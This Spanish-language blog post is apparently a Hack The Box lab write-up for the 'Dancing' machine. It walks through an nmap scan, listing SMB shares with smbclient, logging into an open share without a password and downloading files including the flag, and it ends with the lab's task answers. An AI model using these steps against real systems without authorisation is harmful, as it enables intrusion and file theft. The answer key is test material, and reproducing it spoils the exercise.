---
title: HTB - Starting Point - Tier 0 - Dancing Writeup
date: 2022-08-09 09:20:00 +0800
categories: [HTB, Writeup]
tags: [htb, writeups]     # TAG names should always be lowercase
---

Este post forma parte de la serie **Tier 0** del **Starting Point** de [HTB](https://app.hackthebox.com/starting-point) que iniciamos [aquí]({% post_url 2022-08-09-htb-writeup-tier0-meow %}).

## Dancing

El primer paso será iniciar la máquina (para lo que previamente tendremos que tener establecida nuestra conexión VPN)

![](/assets/posts/20220809/img04.png)

Copiamos la IP del equipo remoto, en mi caso *10.129.186.250*, y lanzamos un **nmap**.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier0]
└─$ nmap -A 10.129.186.250 -oN nmap_output
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-09 12:34 CEST
Nmap scan report for 10.129.186.250
Host is up (0.081s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2022-08-09T14:35:07
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
|_clock-skew: 3h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.54 seconds
```

Significado de las flags:

* `-A`&nbsp;: escaneo completo (aka agresivo) que ejecuta OS detection, version detection, script scanning y traceroute todo del tirón.
* `-oN`&nbsp;: imprime la salida en un fichero de texto con el nombre *nmap_output*

Tenemos el puerto *445/tcp* abierto (SMB) y con el servicio *microsoft-ds* escuchando.

Utilizamos **smbclient** para conectarnos y sacar un listado de los recursos disponibles con el comando ```-L```&nbsp;. Como no tenemos password, cuando nos la pide le damos al Enter.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier0]
└─$ smbclient -L 10.129.186.250
Password for [WORKGROUP\ewan67]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.186.250 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Probamos a conectarnos a cada uno de los recursos que aparecen en el listado anterior a ver si alguno nos deja entrar sin contraseña. (Spoiler: el único que rula es el último).

Una vez dentro, brujuleamos y nos descargamos lo que nos parezca interesante.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier0]
└─$ smbclient \\\\10.129.186.250\\WorkShares
Password for [WORKGROUP\ewan67]:
Try "help" to get a list of possible commands.
smb: \> ls -la
NT_STATUS_NO_SUCH_FILE listing \-la
smb: \> ls
  .                                   D        0  Mon Mar 29 10:22:01 2021
  ..                                  D        0  Mon Mar 29 10:22:01 2021
  Amy.J                               D        0  Mon Mar 29 11:08:24 2021
  James.P                             D        0  Thu Jun  3 10:38:03 2021

                5114111 blocks of size 4096. 1732567 blocks available
smb: \> cd Amy.J
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 11:08:24 2021
  ..                                  D        0  Mon Mar 29 11:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 12:00:37 2021

                5114111 blocks of size 4096. 1732567 blocks available
smb: \Amy.J\> get worknotes.txt
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.3 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \Amy.J\> cd ..
smb: \> cd James.P\
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 10:38:03 2021
  ..                                  D        0  Thu Jun  3 10:38:03 2021
  flag.txt                            A       32  Mon Mar 29 11:26:57 2021

                5114111 blocks of size 4096. 1732440 blocks available
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.1 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \James.P\>
```

En nuestro directorio de trabajo tendremos descargado el fichero *flag.txt* con la bandera correspondiente.

## Respuestas:

* <strong>Task 1</strong>: Server Message Block
* <strong>Task 2</strong>: 445
* <strong>Task 3</strong>: microsoft-ds
* <strong>Task 4</strong>: -L
* <strong>Task 5</strong>: WorkShares
* <strong>Task 6</strong>: get